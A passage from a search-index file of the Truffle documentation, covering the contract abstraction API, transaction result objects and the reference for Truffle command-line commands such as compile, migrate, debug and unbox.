, address : '0x035b8A9e427d93D178E2D22d600B779717696831' , type : 'mined' , id : 'log_70be22b0' , event : 'Transfer' , args : Result { '0' : '0x7FEb9FAA5aED0FD547Ccc70f00C19dDe95ea54d4' , '1' : '0x7FEb9FAA5aED0FD547Ccc70f00C19dDe95ea54d4' , '2' : < BN : 1 > , __length__ : 3 , _from : '0x7FEb9FAA5aED0FD547Ccc70f00C19dDe95ea54d4' , _to : '0x7FEb9FAA5aED0FD547Ccc70f00C19dDe95ea54d4' , _value : < BN : 1 > } } ], } Note that if the function being executed in the transaction has a return value, you will not get that return value inside this result. You must instead use an event (like ValueSet ) and look up the result in the logs array. Explicitly making a call instead of a transaction \u00b6 We can call setValue() without creating a transaction by explicitly using .call : const value = await instance . setValue . call ( 5 ); This isn't very useful in this case, since setValue() sets things, and the value we pass won't be saved since we're not creating a transaction. Calling getters \u00b6 However, we can get the value using getValue() , using .call() . Calls are always free and don't cost any Ether, so they're good for calling functions that read data off the blockchain: const value = await instance . getValue . call (); // value reprsents the `value` storage object in the solidity contract // since the contract returns that value. Even more helpful, however is we don't even need to use .call when a function is marked as view or pure (or the deprecated constant ), because @truffle/contract will automatically know that that function can only be interacted with via a call: const value = await instance . getValue (); // val reprsents the `value` storage object in the solidity contract // since the contract returns that value. Processing transaction results \u00b6 When you make a transaction, you're given a result object that gives you a wealth of information about the transaction. You're given the transaction has ( result.tx ), the decoded events (also known as logs; result.logs ), and a transaction receipt ( result.receipt ). In the below example, you'll recieve the ValueSet() event because you triggered the event using the setValue() function: const result = await instance . setValue ( 5 ); // result.tx => transaction hash, string // result.logs => array of trigger events (1 item in this case) // result.receipt => receipt object Sending Ether / Triggering the fallback function \u00b6 You can trigger the fallback function by sending a transaction to this function: const result = instance . sendTransaction ({...}); // Same result object as above. This is promisified like all available contract instance functions, and has the same API as web3.eth.sendTransaction without the callback. The to value will be automatically filled in for you. If you only want to send Ether to the contract a shorthand is available: const result = await instance . send ( web3 . toWei ( 1 , \"ether\" )); // Same result object as above. Estimating gas usage \u00b6 Run this function to estimate the gas usage: const result = instance . setValue . estimateGas ( 5 ); // result => estimated gas for this transaction","title":"Contract Abstractions"},{"location":"docs/truffle/reference/contract-abstractions.html#contract-abstractions","text":"Truffle provides contract abstractions for interacting with your contracts. Skip ahead to the api section for a list of contract methods.","title":"Contract Abstractions"},{"location":"docs/truffle/reference/contract-abstractions.html#usage","text":"To obtain a contract abstraction you can require it with the contract name from the artifacts object. Outside of the console this is an object available in migration files, tests, and exec scripts. You would require your contract as follows: const MyContract = artifacts . require ( \"MyContract\" ); You can also obtain one in the developer console. Your contract types are available here and all you need to do is use the at , deployed , or new method. truffle ( development ) > const myContract = await MyContract . deployed (); You now have access to the following functions on MyContract , as well as many others: at() : Create an instance of MyContract that represents your contract at a specific address. deployed() : Create an instance of MyContract that represents the default address managed by MyContract . new() : Deploy a new version of this contract to the network, getting an instance of MyContract that represents the newly deployed instance. Each instance is tied to a specific address on the Ethereum network, and each instance has a 1-to-1 mapping from Javascript functions to contract functions. For instance, if your Solidity contract had a function defined someFunction(uint value) {} (solidity), then you could execute that function on the network like so: let deployed ; MyContract . deployed () . then (( instance ) => { deployed = instance ; return deployed . someFunction ( 5 ); }). then (( result ) => { // Do something with the result or continue with more transactions. }); You can also use async/await syntax which is often much less verbose. We will use async/await for the rest of this document but you may also use a promises for interfacing with contract methods as well. const deployed = await MyContract . deployed (); const result = await deployed . someFunction ( 5 ); // Do something with the result or continue with more transactions. See the processing transaction results section to learn more about the results object obtained from making transactions. Contract methods and events have an EventEmitter interface. So you can set up handlers like the following: const example = await artifacts . require ( \"Example\" ). deployed (); example . setValue ( 45 ) . on ( 'transactionHash' , hash => {}) . on ( 'receipt' , receipt => {}) . on ( 'error' , error => {}) . on ( 'confirmation' , ( num , receipt ) => {}) . then ( receipt => {}); example . ExampleEvent () . on ( 'data' , event => ... etc ... ) example . ExampleEvent () . once ( 'data' , event => ... etc ... )","title":"Usage"},{"location":"docs/truffle/reference/contract-abstractions.html#api","text":"There are two API's you'll need to be aware of. One is the static Contract Abstraction API and the other is the Contract Instance API. The Abstraction API is a set of functions that exist for all contract abstractions, and those function exist on the abstraction itself (i.e., MyContract.at() ). In contrast, the Instance API is the API available to contract instances -- i.e., abstractions that represent a specific contract on the network -- and that API is created dynamically based on functions available in your Solidity source file.","title":"API"},{"location":"docs/truffle/reference/contract-abstractions.html#contract-abstraction-api","text":"Each contract abstraction -- MyContract in the examples above -- have the following useful functions:","title":"Contract Abstraction API"},{"location":"docs/truffle/reference/contract-abstractions.html#mycontractnewarg1-arg2-tx-params","text":"This function take whatever contructor parameters your contract requires and deploys a new instance of the contract to the network. There's an optional last argument which you can use to pass transaction parameters including the transaction from address, gas limit and gas price. This function returns a Promise that resolves into a new instance of the contract abstraction at the newly deployed address.","title":"MyContract.new([arg1, arg2, ...], [tx params])"},{"location":"docs/truffle/reference/contract-abstractions.html#mycontractataddress","text":"This function creates a new instance of the contract abstraction representing the contract at the passed in address. Returns a \"thenable\" object (not yet an actual Promise for backward compatibility). Resolves to a contract abstraction instance after ensuring code exists at the specified address.","title":"MyContract.at(address)"},{"location":"docs/truffle/reference/contract-abstractions.html#mycontractdeployed","text":"Creates an instance of the contract abstraction representing the contract at its deployed address. The deployed address is a special value given to @truffle/contract that, when set, saves the address internally so that the deployed address can be inferred from the given Ethereum network being used. This allows you to write code referring to a specific deployed contract without having to manage those addresses yourself. Like at() , deployed() is thenable, and will resolve to a contract abstraction instance representing the deployed contract after ensuring that code exists at that location and that that address exists on the network being used.","title":"MyContract.deployed()"},{"location":"docs/truffle/reference/contract-abstractions.html#mycontractlinkinstance","text":"Link a library represented by a contract abstraction instance to MyContract. The library must first be deployed and have its deployed address set. The name and deployed address will be inferred from the contract abstraction instance. When this form of MyContract.link() is used, MyContract will consume all of the linked library's events and will be able to report that those events occurred during the result of a transaction. Libraries can be linked multiple times and will overwrite their previous linkage. Note: This method has two other forms, but this form is recommended.","title":"MyContract.link(instance)"},{"location":"docs/truffle/reference/contract-abstractions.html#mycontractlinkname-address","text":"Link a library with a specific name and address to MyContract. The library's events will not be consumed using this form.","title":"MyContract.link(name, address)"},{"location":"docs/truffle/reference/contract-abstractions.html#mycontractlinkobject","text":"Link multiple libraries denoted by an Object to MyContract. The keys must be strings representing the library names and the values must be strings representing the addresses. Like above, libraries' events will not be consumed using this form.","title":"MyContract.link(object)"},{"location":"docs/truffle/reference/contract-abstractions.html#mycontractnetworks","text":"View a list of network ids this contract abstraction has been set up to represent.","title":"MyContract.networks()"},{"location":"docs/truffle/reference/contract-abstractions.html#mycontractsetproviderprovider","text":"Sets the web3 provider this contract abstraction will use to make transactions.","title":"MyContract.setProvider(provider)"},{"location":"docs/truffle/reference/contract-abstractions.html#mycontractsetnetworknetwork_id","text":"Sets the network that MyContract is currently representing.","title":"MyContract.setNetwork(network_id)"},{"location":"docs/truffle/reference/contract-abstractions.html#mycontracthasnetworknetwork_id","text":"Returns a boolean denoting whether or not this contract abstraction is set up to represent a specific network.","title":"MyContract.hasNetwork(network_id)"},{"location":"docs/truffle/reference/contract-abstractions.html#mycontractdefaultsnew_defaults","text":"Get's and optionally sets transaction defaults for all instances created from this abstraction. If called without any parameters it will simply return an Object representing current defaults. If an Object is passed, this will set new defaults. Example default transaction values that can be set are: MyContract . defaults ({ from : ..., gas : ..., gasPrice : ..., value : ... }) Setting a default from address, for instance, is useful when you have a contract abstraction you intend to represent one user (i.e., one address).","title":"MyContract.defaults([new_defaults])"},{"location":"docs/truffle/reference/contract-abstractions.html#mycontractclonenetwork_id","text":"Clone a contract abstraction to get another object that manages the same contract artifacts, but using a different network_id . This is useful if you'd like to manage the same contract but on a different network. When using this function, don't forget to set the correct provider afterward. const MyOtherContract = MyContract . clone ( 1337 );","title":"MyContract.clone(network_id)"},{"location":"docs/truffle/reference/contract-abstractions.html#mycontractnumberformat-number_type","text":"You can set this property to choose the number format that abstraction methods return. The default behavior is to return BN. // Choices are: `[\"BigNumber\", \"BN\", \"String\"]. const Example = artifacts . require ( 'Example' ); Example . numberFormat = 'BigNumber' ;","title":"MyContract.numberFormat = number_type"},{"location":"docs/truffle/reference/contract-abstractions.html#mycontracttimeoutblock_timeout","text":"This method allows you to set the block timeout for transactions. Contract instances created from this abstraction will have the specified transaction block timeout. This means that if a transaction does not immediately get mined, it will retry for the specified number of blocks.","title":"MyContract.timeout(block_timeout)"},{"location":"docs/truffle/reference/contract-abstractions.html#mycontractautogas-boolean","text":"If this is set to true, instances created from this abstraction will use web3.eth.estimateGas and then apply a gas multiplier to determine the amount of gas to include with the transaction. The default value for this is true . See gasMultiplier .","title":"MyContract.autoGas = &lt;boolean&gt;"},{"location":"docs/truffle/reference/contract-abstractions.html#mycontractgasmultipliergas_multiplier","text":"This is the value used when autoGas is enabled to determine the amount of gas to include with transactions. The gas is computed by using web3.eth.estimateGas and multiplying it by the gas multiplier. The default value is 1.25 .","title":"MyContract.gasMultiplier(gas_multiplier)"},{"location":"docs/truffle/reference/contract-abstractions.html#contract-instance-api","text":"Each contract instance is different based on the source Solidity contract, and the API is created dynamically. For the purposes of this documentation, let's use the following Solidity source code below: contract MyContract { uint public value ; event ValueSet ( uint val ); function setValue ( uint val ) { value = val ; emit ValueSet ( value ); } function getValue () view returns ( uint ) { return value ; } } From Javascript's point of view, this contract has three functions: setValue , getValue and value . This is because value is public and automatically creates a getter function for it.","title":"Contract Instance API"},{"location":"docs/truffle/reference/contract-abstractions.html#making-a-transaction-via-a-contract-function","text":"When we call setValue() , this creates a transaction. From Javascript: const result = await instance . setValue ( 5 ); // result object contains import information about the transaction console . log ( \"Value was set to\" , result . logs [ 0 ]. args . val ); The result object that gets returned looks like this: { tx : \"0x6cb0bbb6466b342ed7bc4a9816f1da8b92db1ccf197c3f91914fc2c721072ebd\" , receipt : { // The return value from web3.eth.getTransactionReceipt(hash) // See https://github.com/ethereum/wiki/wiki/JavaScript-API#web3ethgettransactionreceipt }, logs : [ { logIndex : 0 , transactionIndex : 0 , transactionHash : '0x728b4d1983cd00d93ae00b7adf76f78c1b32d922de636ead42e93f70cf58cdc9' , blockHash : '0xdce5e6c580267c9bf1d82bf0a167fa60509ef9fc520b8619d8183a8373a42035' , blockNumber : 19 , address : '0x035b8A9e427d93D178E2D22d600B779717696831' , type : 'mined' , id : 'log_70be22b0' , event : 'Transfer' , args : Result { '0' : '0x7FEb9FAA5aED0FD547Ccc70f00C19dDe95ea54d4' , '1' : '0x7FEb9FAA5aED0FD547Ccc70f00C19dDe95ea54d4' , '2' : < BN : 1 > , __length__ : 3 , _from : '0x7FEb9FAA5aED0FD547Ccc70f00C19dDe95ea54d4' , _to : '0x7FEb9FAA5aED0FD547Ccc70f00C19dDe95ea54d4' , _value : < BN : 1 > } } ], } Note that if the function being executed in the transaction has a return value, you will not get that return value inside this result. You must instead use an event (like ValueSet ) and look up the result in the logs array.","title":"Making a transaction via a contract function"},{"location":"docs/truffle/reference/contract-abstractions.html#explicitly-making-a-call-instead-of-a-transaction","text":"We can call setValue() without creating a transaction by explicitly using .call : const value = await instance . setValue . call ( 5 ); This isn't very useful in this case, since setValue() sets things, and the value we pass won't be saved since we're not creating a transaction.","title":"Explicitly making a call instead of a transaction"},{"location":"docs/truffle/reference/contract-abstractions.html#calling-getters","text":"However, we can get the value using getValue() , using .call() . Calls are always free and don't cost any Ether, so they're good for calling functions that read data off the blockchain: const value = await instance . getValue . call (); // value reprsents the `value` storage object in the solidity contract // since the contract returns that value. Even more helpful, however is we don't even need to use .call when a function is marked as view or pure (or the deprecated constant ), because @truffle/contract will automatically know that that function can only be interacted with via a call: const value = await instance . getValue (); // val reprsents the `value` storage object in the solidity contract // since the contract returns that value.","title":"Calling getters"},{"location":"docs/truffle/reference/contract-abstractions.html#processing-transaction-results","text":"When you make a transaction, you're given a result object that gives you a wealth of information about the transaction. You're given the transaction has ( result.tx ), the decoded events (also known as logs; result.logs ), and a transaction receipt ( result.receipt ). In the below example, you'll recieve the ValueSet() event because you triggered the event using the setValue() function: const result = await instance . setValue ( 5 ); // result.tx => transaction hash, string // result.logs => array of trigger events (1 item in this case) // result.receipt => receipt object","title":"Processing transaction results"},{"location":"docs/truffle/reference/contract-abstractions.html#sending-ether-triggering-the-fallback-function","text":"You can trigger the fallback function by sending a transaction to this function: const result = instance . sendTransaction ({...}); // Same result object as above. This is promisified like all available contract instance functions, and has the same API as web3.eth.sendTransaction without the callback. The to value will be automatically filled in for you. If you only want to send Ether to the contract a shorthand is available: const result = await instance . send ( web3 . toWei ( 1 , \"ether\" )); // Same result object as above.","title":"Sending Ether / Triggering the fallback function"},{"location":"docs/truffle/reference/contract-abstractions.html#estimating-gas-usage","text":"Run this function to estimate the gas usage: const result = instance . setValue . estimateGas ( 5 ); // result => estimated gas for this transaction","title":"Estimating gas usage"},{"location":"docs/truffle/reference/truffle-commands.html","text":"Truffle Commands \u00b6 This section will describe every command available in the Truffle application. Usage \u00b6 All commands are in the following form: truffle <command> [ options ] Passing no arguments is equivalent to truffle help , which will display a list of all commands and then exit. Available commands \u00b6 build \u00b6 Execute build pipeline (if configuration present). truffle build Requires the build key to be present in the configuration. See the Building your application and Build processes sections for more details. Warning : The build command and this approach is being deprecated. Please use third-party build tools like webpack or grunt, or see our Truffle Boxes for an example. compile \u00b6 Compile contract source files. truffle compile [ --list <filter> ] [ --all ] [ --network <name> ] [ --quiet ] This will only compile contracts that have changed since the last compile, unless otherwise specified. Options: --list <filter> : List all recent stable releases from solc-bin. If filter is specified then it will display only that type of release or docker tags. The filter parameter must be one of the following: prereleases, releases, latestRelease or docker. --all : Compile all contracts instead of only the contracts changed since last compile. --network <name> : Specify the network to use, saving artifacts specific to that network. Network name must exist in the configuration. --quiet : Suppress all compilation output. config \u00b6 Displays and sets user-level configuration options. truffle config [ --enable-analytics | --disable-analytics ] [[ <get | set> <key> ] [ <value-for-set> ]] Options: --enable-analytics|--disable-analytics : Enable or disable analytics. get : Get a Truffle configuration option value. set : Set a Truffle configuration option value. console \u00b6 Run a console with contract abstractions and commands available. truffle console [ --network <name> ] [ --verbose-rpc ] Spawns an interface to interact with contracts via the command line. Additionally, many Truffle commands are available within the console (without the truffle prefix). Requires an external Ethereum client, such as Ganache or geth. For a console that creates a development and test environment, use truffle develop . See the Using the console section for more details. Options: --network <name> : Specify the network to use. Network name must exist in the configuration. --verbose-rpc : Log communication between Truffle and the Ethereum client. create \u00b6 Helper to create new contracts, migrations and tests. truffle create <artifact_type> <ArtifactName> Options: <artifact_type> : Create a new artifact where artifact_type is one of the following: contract, migration or test. The new artifact is created along with one of the following files: contracts/ArtifactName.sol , migrations/####_artifact_name.js or tests/artifact_name.js . (required) <ArtifactName> : Name of new artifact. (required) Camel case names of artifacts will be converted to underscore-separated file names for the migrations and tests. Number prefixes for migrations are automatically generated. debug \u00b6 Interactively debug any transaction on the blockchain. truffle debug [ <transaction_hash> ] [ --network <network> ] [ --fetch-external ] [ --compile-tests | --compile-all | --compile-none ] Will start an interactive debugging session on a particular transaction. Allows you to step through each action and replay. See the Debugging your contracts section for more details. Options: <transaction_hash> : Transaction ID to use for debugging. You can omit this to simply start the debugger and then load a transaction later. --network : The network to connect to. --fetch-external : Allows the debugger to download source from source verification services to debug transactions involving external contracts. When used, a transaction hash is required. May be abbreviated -x . --compile-tests : Allows the debugger to compile Solidity test contracts . Implies --compile-all . --compile-all : Forces the debugger to recompile all contracts, even when it would otherwise judge doing so unnecessary. Compilation results are not saved. --compile-none : Forces the debugger not to recompile contracts, even when it would otherwise judge it necessary. This option is dangerous and may cause errors. Please only use this if you are sure a recompilation is not necessary. deploy \u00b6 Alias for migrate . See migrate for details. develop \u00b6 Open a console with a development blockchain truffle develop [ --log ] Spawns a local development blockchain, and allows you to interact with contracts via the command line. Additionally, many Truffle commands are available within the console (without the truffle prefix). If you want an interactive console but want to use an existing blockchain, use truffle console . See the Using the console section for more details. Option: --log : Start/Connect to a Truffle develop session and log all RPC activity. See the Log RPC Activity docs for more information about using this option. exec \u00b6 Execute a JS module within the Truffle environment. truffle exec <script.js> [ --network <name> ] [ --compile ] This will include web3 , set the default provider based on the network specified (if any), and include your contracts as global objects while executing the script. Your script must export a function that Truffle can run. See the Writing external scripts section for more details. Options: <script.js> : JavaScript file to be executed. Can include path information if the script does not exist in the current directory. (required) --network <name> : Specify the network to use, using artifacts specific to that network. Network name must exist in the configuration. --compile : Compile contracts before executing the script. help \u00b6 Display a list of all commands or information about a specific command. truffle help [ <command> ] Option: <command> : Display usage information about the specified command. init \u00b6 Initialize new and empty Ethereum project truffle init [ --force ] Creates a new and empty Truffle project within the current working directory. Alert : Older versions of Truffle used `truffle init bare` to create an empty project. This usage has been deprecated. Those looking for the MetaCoin example that used to be available through `truffle init` should use `truffle unbox MetaCoin` instead. Option: --force : Initialize project regardless of the current working directory's state. Be careful, this could overwrite existing files that have name conflicts. install \u00b6 Install a package from the Ethereum Package Registry. truffle install <package_name> [ @<version> ] Options: <package_name> : Name of the package as listed in the Ethereum Package Registry. (required) @<version> : When specified, will install a specific version of the package, otherwise will install the latest version. See the Package Management with EthPM section for more details. migrate \u00b6 Run migrations to deploy contracts. truffle migrate [ --reset ] [ --f <number> ] [ --to <number> ] [ --network <name> ] [ --compile-all ] [ --verbose-rpc ] [ --dry-run ] [ --interactive ] [ --skip-dry-run ] [ --describe-json ] Unless specified, this will run from the last completed migration. See the Migrations section for more details. Options: --reset : Run all migrations from the beginning, instead of running from the last completed migration. --f <number> : Run contracts from a specific migration. The number refers to the prefix of the migration file. --to <number> : Run contracts to a specific migration. The number refers to the prefix of the migration file. --network <name> : Specify the network to use, saving artifacts specific to that network. Network name must exist in the configuration. --compile-all : Compile all contracts instead of intelligently choosing which contracts need to be compiled. --verbose-rpc : Log communication between Truffle and the Ethereum client. --dry-run : Fork the network specified and only perform a test migration. --skip-dry-run : Skip the test migration performed before the real migration. --interactive : Prompt to confirm that the user wants to proceed after the dry run. --describe-json : Prints additional status messages. networks \u00b6 Show addresses for deployed contracts on each network. truffle networks [ --clean ] Use this command before publishing your package to see if there are any extraneous network artifacts you don't want published. With no options specified, this package will simply output the current artifact state. Option: --clean : Remove all network artifacts that aren't associated with a named network. obtain \u00b6 Fetch and cache a specified compiler. truffle obtain [ --solc <version> ] Option: --solc : Download and cache a version of the solc compiler. (required) opcode \u00b6 Print the compiled opcodes for a given contract. truffle opcode <contract_name> Option: <contract_name> : Name of the contract to print opcodes for. Must be a contract name, not a file name. (required) preserve \u00b6 Preserve files and content to decentralised storage platforms such as IPFS or Filecoin. truffle preserve <path> --<recipe> [ --environment <name> ] Options: --ipfs : Preserve files to IPFS --filecoin : Preserve files to Filecoin --buckets : Preserve files to Textile Buckets --<recipe> : Preserve files using an installed plugin with the specified recipe tag --environment <name> : Specify the environment to use (defined in truffle-config.js ) (default: \"development\") Custom options for these \"preserve recipes\" can be provided through environments . Additional preserve recipes can be installed through NPM and configured as Truffle plugins . More information about usage, configuration and installation of preserve recipes can be found on the dedicated documentation page . publish \u00b6 Publish a package to the Ethereum Package Registry. truffle publish All parameters are pulled from your project's configuration file. Takes no arguments. See the Package Management with EthPM section for more details. run \u00b6 Note : This feature is new and still in a barebones state. Please let us know how we can improve it! Run a third-party plugin command truffle run <command> Option: <command> : Name of a command defined by an installed plugin. (required) Install plugins as NPM package dependencies and configure Truffle to recognize the plugin. For more information, see Third-Party Plugin Commands . test \u00b6 Run JavaScript and Solidity tests. truffle test [ <test_file> ] [ --compile-all [ -debug ]] [ --network <name> ] [ --verbose-rpc ] [ --show-events ] [ --debug ] [ --debug-global <identifier> ] [ --bail ] [ --stacktrace [ -extra ]] Runs some or all tests within the test/ directory as specified. See the section on Testing your contracts for more information. Options: <test_file> : Name of the test file to be run. Can include path information if the file does not exist in the current directory. --compile-all : Compile all contracts instead of intelligently choosing which contracts need to be compiled. --compile-all-debug : Like --compile-all , but compiles contracts in debug mode for extra information. Has no effect on Solidity <0.6.3. --network <name> : Specify the network to use, using artifacts specific to that network. Network name must exist in the configuration. --verbose-rpc : Log communication between Truffle and the Ethereum client. --show-events : Log all contract events. --debug : Provides global debug() function for in-test debugging. Usable with Javascript tests only; implies --compile-all . --debug-global <identifier> : Allows one to rename the debug() function to something else. --bail : Bail after the first test failure. May be abbreviated -b . --stacktrace : Allows for mixed Javascript-and-Solidity stacktraces when a Truffle Contract transaction or deployment reverts. Does not apply to calls or gas estimates. Implies --compile-all . May be abbreviated -t . Warning: This option is still somewhat experimental. --stacktrace-extra : Shortcut for --stacktrace --compile-all-debug . unbox \u00b6 Download a Truffle Box, a pre-built Truffle project. truffle unbox <box_name> [ <destination_path> ] [ --force ] Downloads a Truffle Box to destination_path if provided. Truffle defaults to the current working directory if this argument is not provided. See the list of available Truffle boxes . You can also design and create your own boxes! See the section on Truffle boxes for more information. Options: <box_name> : Name of the Truffle Box. (required) --force : Unbox project in the current directory regardless of its state. Be careful, this will potentially overwrite files that exist in the directory. Note : box_name can be one of several formats: 1. \\<truffleBoxName> - like metacoin (see the official Truffle boxes here ) 2. \\<gitOrgName/repoName> - like truffle-box/bare-box (your repo will have to have the proper structure - see our page on creating a Truffle Box ) 3. \\<urlToGitRepo> - like https://github.com/truffle-box/bare-box 4. \\<sshUrlToGitRepo> - like git@github.com:truffle-box/bare-box Also note that you can add a # followed by a branch name to the end of all of the above formats to unbox from a specific branch - for example, you could use truffle-box/bare-box#myBranch version \u00b6 Show version number and exit. truffle version watch \u00b6 Watch filesystem for changes and rebuild the project automatically. truffle watch This command will initiate a watch for changes to contracts, application, and configuration files. When there's a change, it will rebuild the app as necessary. Alert : This command is deprecated. Please use external tools to watch for filesystem changes and rerun tests.","title":"Truffle Commands"},{"location":"docs/truffle/reference/truffle-commands.html#truffle-commands","text":"This section will describe every command available in the Truffle application.","title":"Truffle Commands"},{"location":"docs/truffle/reference/truffle-commands.html#usage","text":"All commands are in the following form: truffle <command> [ options ] Passing no arguments is equivalent to truffle help , which will display a list of all commands and then exit.","title":"Usage"},{"location":"docs/truffle/reference/truffle-commands.html#available-commands","text":"","title":"Available commands"},{"location":"docs/truffle/reference/truffle-commands.html#build","text":"Execute build pipeline (if configuration present). truffle build Requires the build key to be present in the configuration. See the Building your application and Build processes sections for more details. Warning : The build command and this approach is being deprecated. Please use third-party build tools like webpack or grunt, or see our Truffle Boxes for an example.","title":"build"},{"location":"docs/truffle/reference/truffle-commands.html#compile","text":"Compile contract source files. truffle compile [ --list <filter> ] [ --all ] [ --network <name> ] [ --quiet ] This will only compile contracts that have changed since the last compile, unless otherwise specified. Options: --list <filter> : List all recent stable releases from solc-bin. If filter is specified then it will display only that type of release or docker tags. The filter parameter must be one of the following: prereleases, releases, latestRelease or docker. --all : Compile all contracts instead of only the contracts changed since last compile. --network <name> : Specify the network to use, saving artifacts specific to that network. Network name must exist in the configuration. --quiet : Suppress all compilation output.","title":"compile"},{"location":"docs/truffle/reference/truffle-commands.html#config","text":"Displays and sets user-level configuration options. truffle config [ --enable-analytics | --disable-analytics ] [[ <get | set> <key> ] [ <value-for-set> ]] Options: --enable-analytics|--disable-analytics : Enable or disable analytics. get : Get a Truffle configuration option value. set : Set a Truffle configuration option value.","title":"config"},{"location":"docs/truffle/reference/truffle-commands.html#console","text":"Run a console with contract abstractions and commands available. truffle console [ --network <name> ] [ --verbose-rpc ] Spawns an interface to interact with contracts via the command line. Additionally, many Truffle commands are available within the console (without the truffle prefix). Requires an external Ethereum client, such as Ganache or geth. For a console that creates a development and test environment, use truffle develop . See the Using the console section for more details. Options: --network <name> : Specify the network to use. Network name must exist in the configuration. --verbose-rpc : Log communication between Truffle and the Ethereum client.","title":"console"},{"location":"docs/truffle/reference/truffle-commands.html#create","text":"Helper to create new contracts, migrations and tests. truffle create <artifact_type> <ArtifactName> Options: <artifact_type> : Create a new artifact where artifact_type is one of the following: contract, migration or test. The new artifact is created along with one of the following files: contracts/ArtifactName.sol , migrations/####_artifact_name.js or tests/artifact_name.js . (required) <ArtifactName> : Name of new artifact. (required) Camel case names of artifacts will be converted to underscore-separated file names for the migrations and tests. Number prefixes for migrations are automatically generated.","title":"create"},{"location":"docs/truffle/reference/truffle-commands.html#debug","text":"Interactively debug any transaction on the blockchain. truffle debug [ <transaction_hash> ] [ --network <network> ] [ --fetch-external ] [ --compile-tests | --compile-all | --compile-none ] Will start an interactive debugging session on a particular transaction. Allows you to step through each action and replay. See the Debugging your contracts section for more details. Options: <transaction_hash> : Transaction ID to use for debugging. You can omit this to simply start the debugger and then load a transaction later. --network : The network to connect to. --fetch-external : Allows the debugger to download source from source verification services to debug transactions involving external contracts. When used, a transaction hash is required. May be abbreviated -x . --compile-tests : Allows the debugger to compile Solidity test contracts . Implies --compile-all . --compile-all : Forces the debugger to recompile all contracts, even when it would otherwise judge doing so unnecessary. Compilation results are not saved. --compile-none : Forces the debugger not to recompile contracts, even when it would otherwise judge it necessary. This option is dangerous and may cause errors. Please only use this if you are sure a recompilation is not necessary.","title":"debug"},{"location":"docs/truffle/reference/truffle-commands.html#deploy","text":"Alias for migrate . See migrate for details.","title":"deploy"},{"location":"docs/truffle/reference/truffle-commands.html#develop","text":"Open a console with a development blockchain truffle develop [ --log ] Spawns a local development blockchain, and allows you to interact with contracts via the command line. Additionally, many Truffle commands are available within the console (without the truffle prefix). If you want an interactive console but want to use an existing blockchain, use truffle console . See the Using the console section for more details. Option: --log : Start/Connect to a Truffle develop session and log all RPC activity. See the Log RPC Activity docs for more information about using this option.","title":"develop"},{"location":"docs/truffle/reference/truffle-commands.html#exec","text":"Execute a JS module within the Truffle environment. truffle exec <script.js> [ --network <name> ] [ --compile ] This will include web3 , set the default provider based on the network specified (if any), and include your contracts as global objects while executing the script. Your script must export a function that Truffle can run. See the Writing external scripts section for more details. Options: <script.js> : JavaScript file to be executed. Can include path information if the script does not exist in the current directory. (required) --network <name> : Specify the network to use, using artifacts specific to that network. Network name must exist in the configuration. --compile : Compile contracts before executing the script.","title":"exec"},{"location":"docs/truffle/reference/truffle-commands.html#help","text":"Display a list of all commands or information about a specific command. truffle help [ <command> ] Option: <command> : Display usage information about the specified command.","title":"help"},{"location":"docs/truffle/reference/truffle-commands.html#init","text":"Initialize new and empty Ethereum project truffle init [ --force ] Creates a new and empty Truffle project within the current working directory. Alert : Older versions of Truffle used `truffle init bare` to create an empty project. This usage has been deprecated. Those looking for the MetaCoin example that used to be available through `truffle init` should use `truffle unbox MetaCoin` instead. Option: --force : Initialize project regardless of the current working directory's state. Be careful, this could overwrite existing files that have name conflicts.","title":"init"},{"location":"docs/truffle/reference/truffle-commands.html#install","text":"Install a package from the Ethereum Package Registry. truffle install <package_name> [ @<version> ] Options: <package_name> : Name of the package as listed in the Ethereum Package Registry. (required) @<version> : When specified, will install a specific version of the package, otherwise will install the latest version. See the Package Management with EthPM section for more details.","title":"install"},{"location":"docs/truffle/reference/truffle-commands.html#migrate","text":"Run migrations to deploy contracts. truffle migrate [ --reset ] [ --f <number> ] [ --to <number> ] [ --network <name> ] [ --compile-all ] [ --verbose-rpc ] [ --dry-run ] [ --interactive ] [ --skip-dry-run ] [ --describe-json ] Unless specified, this will run from the last completed migration. See the Migrations section for more details. Options: --reset : Run all migrations from the beginning, instead of running from the last completed migration. --f <number> : Run contracts from a specific migration. The number refers to the prefix of the migration file. --to <number> : Run contracts to a specific migration. The number refers to the prefix of the migration file. --network <name> : Specify the network to use, saving artifacts specific to that network. Network name must exist in the configuration. --compile-all : Compile all contracts instead of intelligently choosing which contracts need to be compiled. --verbose-rpc : Log communication between Truffle and the Ethereum client. --dry-run : Fork the network specified and only perform a test migration. --skip-dry-run : Skip the test migration performed before the real migration. --interactive : Prompt to confirm that the user wants to proceed after the dry run. --describe-json : Prints additional status messages.","title":"migrate"},{"location":"docs/truffle/reference/truffle-commands.html#networks","text":"Show addresses for deployed contracts on each network. truffle networks [ --clean ] Use this command before publishing your package to see if there are any extraneous network artifacts you don't want published. With no options specified, this package will simply output the current artifact state. Option: --clean : Remove all network artifacts that aren't associated with a named network.","title":"networks"},{"location":"docs/truffle/reference/truffle-commands.html#obtain","text":"Fetch and cache a specified compiler. truffle obtain [ --solc <version> ] Option: --solc : Download and cache a version of the solc compiler. (required)","title":"obtain"},{"location":"docs/truffle/reference/truffle-commands.html#opcode","text":"Print the compiled opcodes for a given contract. truffle opcode <contract_name> Option: <contract_name> : Name of the contract to print opcodes for. Must be a contract name, not a file name. (required)","title":"opcode"},{"location":"docs/truffle/reference/truffle-commands.html#preserve","text":"Preserve files and content to decentralised storage platforms such as IPFS or Filecoin. truffle preserve <path> --<recipe> [ --environment <name> ] Options: --ipfs : Preserve files to IPFS --filecoin : Preserve files to Filecoin --buckets : Preserve files to Textile Buckets --<recipe> : Preserve files using an installed plugin with the specified recipe tag --environment <name> : Specify the environment to use (defined in truffle-config.js ) (default: \"development\") Custom options for these \"preserve recipes\" can be provided through environments . Additional preserve recipes can be installed through NPM and configured as Truffle plugins . More information about usage, configuration and installation of preserve recipes can be found on the dedicated documentation page .","title":"preserve"},{"location":"docs/truffle/reference/truffle-commands.html#publish","text":"Publish a package to the Ethereum Package Registry. truffle publish All parameters are pulled from your project's configuration file. Takes no arguments. See the Package Management with EthPM section for more details.","title":"publish"},{"location":"docs/truffle/reference/truffle-commands.html#run","text":"Note : This feature is new and still in a barebones state. Please let us know how we can improve it! Run a third-party plugin command truffle run <command> Option: <command> : Name of a command defined by an installed plugin. (required) Install plugins as NPM package dependencies and configure Truffle to recognize the plugin. For more information, see Third-Party Plugin Commands .","title":"run"},{"location":"docs/truffle/reference/truffle-commands.html#test","text":"Run JavaScript and Solidity tests. truffle test [ <test_file> ] [ --compile-all [ -debug 